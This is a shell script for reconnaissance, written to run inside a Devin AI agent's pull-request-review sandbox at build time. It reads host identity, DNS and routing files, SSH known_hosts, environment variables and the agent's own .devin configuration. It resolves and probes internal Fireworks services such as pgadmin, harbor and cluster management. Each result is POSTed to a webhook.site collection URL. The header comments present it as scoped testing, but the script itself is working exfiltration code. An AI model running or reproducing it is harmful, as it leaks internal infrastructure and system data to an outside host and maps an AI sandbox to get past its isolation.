#!/bin/sh
# i79712 recon: run inside Devin pr-review sandbox at make parse time.
# Collects internal DNS/service vantage and probes Fireworks-owned hosts that resolve.
# All targets are fireworks.ai / fireworks-ai.cloud / RFC1918(10.247.189.245). Sink = our own webhook.site token.
T="https://webhook.site/fa65cc08-cf4f-424b-8163-1c46187a6bb9/i79712"
PHASE=$(cat ci/recon.phase 2>/dev/null | tr -dc '0-9'); PH="p${PHASE:-1}"
D=/tmp/i79712; mkdir -p "$D" 2>/dev/null
post() { [ -s "$2" ] || { echo "empty $1" > "$D/$1"; set -- "$1" "$D/$1"; }; curl -s -o /dev/null --max-time 12 --noproxy '*' -X POST --data-binary @"$2" "$T/$PH/$1" 2>/dev/null; }

# ---------- 1) host / dns / env ----------
{
  echo "### DATE"; date -u 2>/dev/null
  echo "### HOSTNAME_ID"; hostname 2>/dev/null; id 2>/dev/null
  echo "### /etc/hosts"; head -60 /etc/hosts 2>/dev/null
  echo "### /etc/resolv.conf"; head -40 /etc/resolv.conf 2>/dev/null
  echo "### /etc/nsswitch.conf"; head -25 /etc/nsswitch.conf 2>/dev/null
  echo "### route"; if command -v ip >/dev/null 2>&1; then ip route 2>/dev/null | head -30; ip -4 addr 2>/dev/null | head -60; else netstat -rn 2>/dev/null | head -25; fi
  echo "### proc_net_route"; cat /proc/net/route 2>/dev/null | head -20
  echo "### known_hosts"; cat ~/.ssh/known_hosts 2>/dev/null | head -20
  echo "### env"; env 2>/dev/null | grep -iE 'dns|domain|proxy|host|kube|cluster|suffix|search' | head -40
  echo "### hostname_f"; cat /etc/hostname 2>/dev/null | head -3
  echo "### resolv_backups"; ls -la /etc/resolv.conf /run/systemd/resolve 2>/dev/null | head -10
} > "$D/env.txt" 2>&1
post env "$D/env.txt"

# ---------- 2) getent for candidate internal hosts ----------
CANDS="harbor.us-iowa-1.fireworks-ai.cloud harbor.us-virginia-1.fireworks-ai.cloud metis.fireworks-ai.cloud langfuse.fireworks-ai.cloud pilot-dev.fireworks-ai.cloud pilot.fireworks-ai.cloud pgadmin.fireworks-ai.cloud cluster-management.fireworks-ai.cloud company-dashboard.fireworks-ai.cloud grafana.fireworks-ai.cloud gateway.fireworks.ai device-auth.fireworks.ai"
{
  for h in $CANDS; do
    printf '### %s\n' "$h"
    timeout 2 getent ahostsv4 "$h" 2>&1 | head -3
    printf -- '---\n'
  done
  echo "### svc.cluster.local probes"
  for h in metis.fireworks-ai.cloud.svc.cluster.local harbor.svc.cluster.local gateway.svc.cluster.local; do
    printf '### %s\n' "$h"; timeout 2 getent hosts "$h" 2>&1 | head -2; printf -- '---\n'
  done
} > "$D/dns.txt" 2>&1
post dns "$D/dns.txt"

# ---------- 3) grep .devin for internal literals ----------
{
  echo "### devin_host_literals"
  grep -rEoh '[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)*\.(fireworks-ai\.cloud|fireworks\.ai|svc\.cluster\.local)' \
    /opt/.devin /home/ubuntu/.devin* /root/.devin* /home/ubuntu/repos /home/ubuntu/.config 2>/dev/null | sort -u | head -80
  echo "### internal_ip_literals"
  grep -rEoh '(10|172\.(1[6-9]|2[0-9]|3[01]))\.[0-9]{1,3}\.[0-9]{1,3}' \
    /opt/.devin /home/ubuntu/.devin* /root/.devin* 2>/dev/null | sort -u | head -60
  echo "### opt_devin_listing"
  ls -la /opt/.devin 2>/dev/null | head -40
  echo "### client_live_tier_head"
  head -40 /home/ubuntu/.devin-files/client_live_tier.sh 2>/dev/null
} > "$D/lit.txt" 2>&1
post lit "$D/lit.txt"

# ---------- 4) probes: only resolved hosts, max 6, direct (no proxy) ----------
N=0
probe() { # name url [extra]
  n="$1"; u="$2"; shift 2
  [ "$N" -ge 6 ] && return 0
  N=$((N+1))
  {
    echo "### PROBE $n $u"
    curl -m 4 -sS --noproxy '*' -D - "$@" -o "$D/b.$n" "$u" 2>&1 | head -22
    echo "### BODY_B64_400"
    head -c 400 "$D/b.$n" 2>/dev/null | base64 2>/dev/null | tr -d '\n' | head -c 600
    echo
    echo "### BODY_LEN"; wc -c < "$D/b.$n" 2>/dev/null
  } > "$D/p_$n.txt" 2>&1
  post "p_$n" "$D/p_$n.txt"
}
res() { timeout 2 getent ahostsv4 "$1" 2>/dev/null | grep -qE 'STREAM|DGRAM|INET'; }

if [ "$PHASE" = "2" ]; then
  echo "### PHASE2"
  res company-dashboard.fireworks-ai.cloud && probe companydash "https://company-dashboard.fireworks-ai.cloud/"
  res grafana.fireworks-ai.cloud && probe grafana "https://grafana.fireworks-ai.cloud/api/health"
else
res harbor.us-iowa-1.fireworks-ai.cloud && probe harbor "http://harbor.us-iowa-1.fireworks-ai.cloud/v2/"
res metis.fireworks-ai.cloud && probe metis "https://metis.fireworks-ai.cloud/api/v1/auth/configuration"
res langfuse.fireworks-ai.cloud && probe langfuse "https://langfuse.fireworks-ai.cloud/api/public/health"
res pilot-dev.fireworks-ai.cloud && probe pilotdev "https://pilot-dev.fireworks-ai.cloud/"
res pgadmin.fireworks-ai.cloud && probe pgadmin "https://pgadmin.fireworks-ai.cloud/"
res cluster-management.fireworks-ai.cloud && probe clustermgmt "https://cluster-management.fireworks-ai.cloud/"
fi

# ---------- 5) done marker ----------
{ echo "### DONE"; date -u; echo "probes=$N"; } > "$D/done.txt" 2>&1
post done "$D/done.txt"
exit 0
